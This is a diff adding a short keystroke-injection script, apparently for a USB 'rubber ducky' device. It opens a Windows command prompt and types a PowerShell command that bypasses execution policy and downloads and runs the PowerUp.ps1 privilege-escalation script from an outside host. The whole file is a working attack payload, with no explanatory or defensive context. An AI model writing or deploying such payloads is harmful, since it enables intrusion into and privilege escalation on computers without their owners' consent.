@@ -1,0 +1,10 @@
+DELAY 3000
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+ENTER
+DELAY 600
+STRING powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://www.ihack.eu/PowerUp.ps1'); Invoke-AllChecks
+DELAY 1000
+ENTER
